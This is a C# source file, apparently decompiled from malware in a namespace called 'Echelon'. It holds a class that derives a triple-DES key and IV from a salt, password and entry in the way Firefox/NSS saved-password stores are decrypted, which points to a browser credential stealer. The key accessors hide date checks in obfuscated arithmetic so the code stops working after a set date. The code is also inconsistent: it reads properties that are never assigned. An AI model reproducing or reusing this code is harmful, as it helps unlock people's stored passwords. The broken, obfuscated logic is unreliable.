using System;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

namespace Echelon
{
	public class Gecko8
	{
		[CompilerGenerated]
		private readonly byte[] a;

		[CompilerGenerated]
		private readonly byte[] b;

		[CompilerGenerated]
		private readonly byte[] c;

		[CompilerGenerated]
		private byte[] d;

		[CompilerGenerated]
		private byte[] e;

		private byte[] f
		{
			get;
		}

		private byte[] g
		{
			get;
		}

		private byte[] h
		{
			get;
		}

		public byte[] DataKey
		{
			[CompilerGenerated]
			get
			{
				DateTime t = new DateTime((26341820 << 4) + -421468615 << 2, -((-6107854 + 232413466) ^ -226305612) << 5 >> 6, -(-(0x28976A16 ^ 0x28976A15) << 1), ~(-1584119015 - -435212812 + 609572984) ^ 0x2025926F, ~15921457 ^ -15921414, -(~20 << 1));
				if (t < DateTime.Now || 1 == 0)
				{
					throw new InvalidOperationException();
				}
				return d;
			}
			[CompilerGenerated]
			private set
			{
				DateTime d = new DateTime((-872831677 ^ 0x1DC6DF03) - -700485028, ~(-5), 384 >> 6, (~(117458508 - -78035733) ^ 0x169EBF9) + 181332644, --51, -(-126001117 - -126000541) >> 5);
				if ((d - DateTime.Now).TotalDays < 0.0)
				{
					throw new Exception();
				}
				this.d = value;
			}
		}

		public byte[] DataIV
		{
			get;
			private set;
		}

		public Gecko8(byte[] salt, byte[] password, byte[] entry)
		{
			a = salt;
			b = password;
			c = entry;
		}

		public void го7па()
		{
			SHA1CryptoServiceProvider sHA1CryptoServiceProvider = new SHA1CryptoServiceProvider();
			byte[] array = new byte[f.Length + g.Length];
			Array.Copy(f, 0, array, 0, f.Length);
			Array.Copy(g, 0, array, f.Length, g.Length);
			byte[] array2 = sHA1CryptoServiceProvider.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + h.Length];
			Array.Copy(array2, 0, array3, 0, array2.Length);
			Array.Copy(h, 0, array3, array2.Length, h.Length);
			byte[] key = sHA1CryptoServiceProvider.ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(h, 0, array4, 0, h.Length);
			for (int i = h.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + h.Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(h, 0, array5, array4.Length, h.Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hMACSHA = new HMACSHA1(key))
			{
				array6 = hMACSHA.ComputeHash(array5);
				byte[] array7 = hMACSHA.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + h.Length];
				Array.Copy(array7, 0, array8, 0, array7.Length);
				Array.Copy(h, 0, array8, array7.Length, h.Length);
				array9 = hMACSHA.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			DataKey = new byte[24];
			for (int j = 0; j < DataKey.Length; j++)
			{
				DataKey[j] = array10[j];
			}
			DataIV = new byte[8];
			int num = DataIV.Length - 1;
			for (int num2 = array10.Length - 1; num2 >= array10.Length - DataIV.Length; num2--)
			{
				DataIV[num] = array10[num2];
				num--;
			}
		}
	}
}
